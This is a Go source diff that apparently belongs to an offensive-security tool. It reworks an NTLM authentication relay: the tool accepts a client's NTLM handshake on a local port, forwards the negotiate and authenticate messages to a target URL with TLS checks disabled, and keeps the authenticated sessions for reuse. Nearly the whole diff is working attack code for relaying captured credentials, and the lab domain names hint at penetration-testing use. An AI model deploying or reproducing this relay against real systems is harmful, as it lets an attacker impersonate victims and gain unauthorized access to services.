@@ -25,6 +25,11 @@ import (
 var client map[string]bool
 var TargetURL string
 
+type Relay struct {
+	target string
+	conn   *http.Client
+}
+
 func Run(target string) {
 	serverAddr := "127.0.0.1:8081"
 	TargetURL = target
@@ -64,26 +69,32 @@ func Run(target string) {
 			break
 		}
 
-		relais := NTLMAuthHTTPRelay{
-			ClientConnUUID: strings.Split(uuid.NewString(), "-")[0],
-			clientConn:     conn,
-			NTLMHandler: ntlm.NTLMAuth{
-				Challenge:              "00000000",
-				DomainName:             "smbdomain",
-				ServerName:             "DC",
-				DnsDomainName:          "smbdomain.local",
-				DnsServerName:          "dc.smbdomain.local",
-				PreliminaryChecksFunc:  ntlm.NTLMPreliminaryChecks,
-				DispatchFunc:           ntlm.NTLMDispatch,
-				ServerNegociateFunc:    ntlm.ServerNegociate,
-				ServerChallengeFunc:    ntlm.ServerChallege,
-				ServerAuthenticateFunc: ntlm.ServerAuthenticate,
-			},
-			Target: target,
-			Relays: []*net.Conn{},
-		}
+		go func() {
 
-		relais.handleConnection()
+			relais := NTLMAuthHTTPRelay{
+				ClientConnUUID: strings.Split(uuid.NewString(), "-")[0],
+				clientConn:     conn,
+				NTLMHandler: ntlm.NTLMAuth{
+					Challenge:              "00000000",
+					DomainName:             "smbdomain",
+					ServerName:             "DC",
+					DnsDomainName:          "smbdomain.local",
+					DnsServerName:          "dc.smbdomain.local",
+					PreliminaryChecksFunc:  ntlm.NTLMPreliminaryChecks,
+					DispatchFunc:           ntlm.NTLMDispatch,
+					ServerNegociateFunc:    ntlm.ServerNegociate,
+					ServerChallengeFunc:    ntlm.ServerChallege,
+					ServerAuthenticateFunc: ntlm.ServerAuthenticate,
+				},
+				Relays: []Relay{},
+			}
+
+			err := relais.initiateRelais(target)
+			if err != nil {
+				logger.Println(err)
+				return
+			}
+		}()
 	}
 }
 
@@ -91,13 +102,20 @@ type NTLMAuthHTTPRelay struct {
 	ClientConnUUID string
 	clientConn     net.Conn
 	NTLMHandler    ntlm.NTLMAuth
-	Target         string
-	Relays         []*net.Conn
+	Relays         []Relay
 }
 
-func (n NTLMAuthHTTPRelay) handleConnection() error {
+func (n NTLMAuthHTTPRelay) initiateRelais(target string) error {
 	// Read client -> gop request
 	logger.Printf("[+] Receive conenction from %s to %s\n", n.clientConn.RemoteAddr(), n.clientConn.LocalAddr())
+
+	// proxyURL, _ := url.Parse("http://127.0.0.1:8888")
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		// Proxy:           http.ProxyURL(proxyURL),
+	}
+
+	client := &http.Client{Transport: tr}
 
 	for {
 		reader := bufio.NewReader(n.clientConn)
@@ -130,34 +148,6 @@ func (n NTLMAuthHTTPRelay) handleConnection() error {
 			}
 
 			continue
-			// logger.Println("\n[+] Wait to read\n")
-
-			// clientNegociateRequest, err := http.ReadRequest(reader)
-			// if err != nil {
-			// 	logger.Println(err)
-			// 	return err
-			// }
-			// logger.Println("\n[+] Rode packets\n")
-
-			// clientNegotiateRequestDump, err := httputil.DumpRequest(clientNegociateRequest, true)
-			// if err != nil {
-			// 	logger.Println(err)
-			// 	return err
-			// }
-			// io.Copy(ioutil.Discard, clientNegociateRequest.Body)
-			// clientNegociateRequest.Body.Close()
-
-			// for _, line := range strings.Split(string(clientNegotiateRequestDump), "\n") {
-			// 	logger.Printf("%s | client > gop | %s\n", n.ClientConnUUID.String(), line)
-			// }
-
-			// // Get the response header.
-			// clientAuthorization := clientNegociateRequest.Header.Get("Authorization")
-			// if clientAuthorization == "" {
-			// 	logger.Printf("%s | No authorisation returned. Closing Connection.\n", n.ClientConnUUID)
-			// 	// n.clientConn.Close()
-			// 	continue
-			// }
 		}
 
 		// Get the response header.
@@ -171,11 +161,6 @@ func (n NTLMAuthHTTPRelay) handleConnection() error {
 		msgType := binary.LittleEndian.Uint32(authorization_bytes[8:12])
 
 		logger.Printf("%s | [+] Message type : %d\n", n.ClientConnUUID, msgType)
-
-		tr := &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		}
-		client := &http.Client{Transport: tr}
 
 		// Received Negociate message. Handle it and answer with a Challenge message
 		if msgType == uint32(1) {
@@ -256,14 +241,6 @@ func (n NTLMAuthHTTPRelay) handleConnection() error {
 			 *
 			 */
 
-			// serverChallengeNTLM := ntlm.NewNTLMSSP_CHALLENGE(string(clientChallengeNTLM.Challenge), "offsec.lab")
-			// msg2b64 := base64.RawStdEncoding.EncodeToString(serverChallengeNTLM.ToBytes())
-			// header := fmt.Sprintf("Www-Authenticate : NTLM %s", msg2b64)
-
-			// header := fmt.Sprintf("Www-Authenticate : NTLM %s", clientChallengeNTLM.ToBytes())
-
-			// clientInitialResponseByte := []byte(fmt.Sprintf("HTTP/1.1 401 Unauthorized\n%s\nWww-Authenticate: Negotiate\nConnection: keep-alive\nContent-Length: 0\n\n\n", header))
-
 			n.clientConn.Write(clientNegotiateRespDump)
 			for _, line := range strings.Split(string(clientNegotiateRespDump), "\n") {
 				logger.Printf("%s | client <- gop | %s\n", n.ClientConnUUID, line)
@@ -312,12 +289,19 @@ func (n NTLMAuthHTTPRelay) handleConnection() error {
 			clientAuthRequest.Method = "GET"
 			clientAuthRequest.URL, err = url.Parse(TargetURL)
 			if err != nil {
+				logger.Println(err)
 				return err
 			}
 			clientAuthRequest.Header.Set("Connection", "keep-alive")
+			clientAuthRequest.Header.Set("Content-Length", "0")
+			if clientAuthRequest.Header.Get("Accept-Encoding") == "gzip" {
+				clientAuthRequest.Header.Del("Accept-Encoding")
+			}
+			clientAuthRequest.Header.Set("Accept-Encoding", "deflate")
 
 			clientAuthRequestDump, err := httputil.DumpRequest(clientAuthRequest, true)
 			if err != nil {
+				logger.Println(err)
 				return err
 			}
 
@@ -328,15 +312,16 @@ func (n NTLMAuthHTTPRelay) handleConnection() error {
 
 			clientAuthResp, err := client.Do(clientAuthRequest)
 			if err != nil {
+				logger.Println(err)
+				return err
+			}
+			clientAuthRespDump, err := httputil.DumpResponse(clientAuthResp, true)
+			if err != nil {
+				logger.Println(err)
 				return err
 			}
 			io.Copy(ioutil.Discard, clientAuthResp.Body)
 			clientAuthResp.Body.Close()
-
-			clientAuthRespDump, err := httputil.DumpResponse(clientAuthResp, true)
-			if err != nil {
-				return err
-			}
 
 			for _, line := range strings.Split(string(clientAuthRespDump), "\n") {
 				logger.Printf("%s | gop <- target : %s\n", n.ClientConnUUID, line)
@@ -349,9 +334,16 @@ func (n NTLMAuthHTTPRelay) handleConnection() error {
 			 *
 			 */
 
-			continue
+			break
 		}
 	}
+
+	n.Relays = append(n.Relays, Relay{
+		target: target,
+		conn:   client,
+	})
+
+	return nil
 }
 
 func KeepAlive(w http.ResponseWriter, wg *sync.WaitGroup) {
